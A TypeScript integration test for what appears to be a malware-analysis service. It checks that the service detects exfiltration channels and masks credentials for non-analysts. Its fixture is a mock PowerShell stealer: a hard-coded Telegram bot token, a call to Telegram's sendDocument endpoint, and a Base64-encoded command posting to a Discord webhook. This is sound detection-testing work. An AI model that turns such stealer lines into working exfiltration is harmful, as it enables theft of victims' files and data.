import { buildApp } from '../../src/app';
import { env } from '../../src/env';
import { hashPassword } from '../../src/lib/crypto';
import { prisma } from '../../src/lib/prisma';
import { ensureBucket } from '../../src/lib/s3';

// Canais de exfiltracao (plans/analise-estatica-ampliada, item 3): um stealer em PowerShell com o
// token do bot do Telegram em claro e o webhook do Discord numa camada Base64. A rota junta as
// origens, o risco conta o canal com credencial, e quem nao e analista ve a credencial cortada,
// na rota e na propria ficha.

let fails = 0;
const ok = (label: string, cond: boolean | undefined, detail: unknown = '') => {
  if (!cond) fails++;
  console.log(`${cond ? 'ok  ' : 'FALHA'} ${label}${cond ? '' : ' ' + JSON.stringify(detail)}`);
};

const BOT = '7123456789:AAH4kD9xZ2mQ7pR1sT5uV8wX0yZ3aB6cD9e';
const HOOK =
  'https://discord.com/api/webhooks/123456789012345678/AbCdEfGhIjKlMnOpQrStUvWxYz0123456789_-AbCdEfGhIjKlMnOpQrStUvWx';

async function main() {
  env.CLAMAV_HOST = '';
  env.UPLOAD_DAILY_LIMIT = 0;
  await ensureBucket();
  const app = await buildApp();
  await app.ready();
  const login = async (email: string, role: 'ANALYST' | 'USER') => {
    await prisma.user.create({
      data: { email, displayName: email, role, passwordHash: await hashPassword('senha-123!') },
    });
    const r = await app.inject({
      method: 'POST',
      url: '/api/auth/login',
      payload: { email, password: 'senha-123!' },
    });
    return String(r.headers['set-cookie']).split(';')[0];
  };
  const analyst = await login('ana@x.io', 'ANALYST');
  const owner = await login('rui@x.io', 'USER');

  const hidden = Buffer.from(`Invoke-RestMethod -Uri '${HOOK}' -Method Post`, 'utf16le').toString(
    'base64',
  );
  const script = [
    `$t = '${BOT}'`,
    `Invoke-WebRequest "https://api.telegram.org/bot$t/sendDocument?chat_id=-1001234567890"`,
    `powershell -EncodedCommand ${hidden}`,
  ].join('\r\n');
  const boundary = '----dl' + Math.random();
  const body = Buffer.concat([
    Buffer.from(
      `--${boundary}\r\nContent-Disposition: form-data; name="file"; filename="rouba.ps1"\r\nContent-Type: text/plain\r\n\r\n`,
    ),
    Buffer.from(script),
    Buffer.from(`\r\n--${boundary}--\r\n`),
  ]);
  const up = await app.inject({
    method: 'POST',
    url: '/api/entries/file',
    payload: body,
    headers: { cookie: owner, 'content-type': `multipart/form-data; boundary=${boundary}` },
  });
  const id = up.json().entry.id as string;

  const full = (
    await app.inject({
      method: 'GET',
      url: `/api/entries/${id}/channels`,
      headers: { cookie: analyst },
    })
  ).json();
  const kinds = full.channels.map((c: { kind: string; source: string }) => `${c.kind}:${c.source}`);
  ok(
    'analista: o token nas strings, o chat_id e o webhook achado na camada decodificada',
    full.masked === false &&
      kinds.includes('telegram-bot:strings') &&
      kinds.includes('telegram-chat:strings') &&
      kinds.includes('discord-webhook:script') &&
      full.channels.some((c: { value: string }) => c.value === BOT),
    full,
  );
  const cut = (
    await app.inject({
      method: 'GET',
      url: `/api/entries/${id}/channels`,
      headers: { cookie: owner },
    })
  ).json();
  ok(
    'quem enviou (não analista): a credencial sai cortada',
    cut.masked === true &&
      !JSON.stringify(cut).includes(BOT) &&
      !JSON.stringify(cut).includes('AbCdEfGhIjKl') &&
      cut.channels.some((c: { value: string }) => c.value === '-1001234567890'),
    cut,
  );
  const record = await app.inject({
    method: 'GET',
    url: `/api/entries/${id}`,
    headers: { cookie: owner },
  });
  ok(
    'a ficha também não leva a credencial inteira para quem não é analista',
    record.statusCode === 200 &&
      !record.body.includes(BOT) &&
      record.json().entry.staticInfo.channels.length >= 3,
    record.statusCode,
  );
  const analystRecord = await app.inject({
    method: 'GET',
    url: `/api/entries/${id}`,
    headers: { cookie: analyst },
  });
  ok('para o analista, a ficha leva o token inteiro', analystRecord.body.includes(BOT));
  const risk = (
    await app.inject({
      method: 'GET',
      url: `/api/entries/${id}/risk`,
      headers: { cookie: analyst },
    })
  ).json();
  ok(
    'risco: canal com credencial',
    risk.risk?.reasons?.some(
      (r: { source: string; weight: number }) =>
        r.source === 'Canais de exfiltração' && r.weight === 35,
    ),
    risk.risk?.reasons,
  );
  const missing = await app.inject({
    method: 'GET',
    url: '/api/entries/nao-existe/channels',
    headers: { cookie: analyst },
  });
  ok('amostra inexistente: 404', missing.statusCode === 404, missing.statusCode);

  await app.close();
  await prisma.$disconnect();
  console.log(fails ? `\n${fails} falha(s)` : '\ntudo ok');
  process.exit(fails ? 1 : 0);
}
main();
